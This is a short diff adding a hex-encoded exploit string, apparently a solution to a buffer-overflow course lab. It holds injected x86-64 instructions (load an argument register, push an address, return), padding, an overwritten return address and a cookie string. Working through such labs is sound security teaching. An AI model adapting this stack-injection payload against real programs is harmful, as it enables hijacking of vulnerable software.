@@ -1,0 +1,8 @@
+48 c7 c7 08 8b 65 55 68
+b8 19 40 00 c3 cc cc cc
+cc cc cc cc cc cc cc cc
+cc cc cc cc cc cc cc cc
+cc cc cc cc cc cc cc cc
+d8 8a 65 55 00 00 00 00
+34 37 65 30 35 36 62 38
+00
